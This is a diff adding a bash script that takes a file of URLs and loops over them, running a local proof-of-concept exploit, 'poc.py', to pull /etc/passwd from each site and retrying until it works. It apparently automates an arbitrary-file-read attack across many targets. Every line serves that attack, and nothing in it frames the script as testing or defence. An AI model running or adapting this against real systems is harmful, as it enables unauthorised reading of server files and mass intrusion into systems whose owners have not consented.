@@ -1,0 +1,17 @@
+#!/usr/bin/env bash
+
+set -o pipefail
+
+echo "Url Input: $1"
+[[ -z "$1" || ! -f "$1" ]] && echo "[!] Err: Please provide a filepath to the urls" && exit 255
+
+for site in $(cat $1); do
+  RC="999"
+  echo "Validating: $site"
+  while [ "$RC" != "0" ]; do
+    ./poc.py -f /etc/passwd -u $site 2>/dev/null | tail -n1
+    RC="$?"
+    sleep 2
+  done
+  echo ""
+done
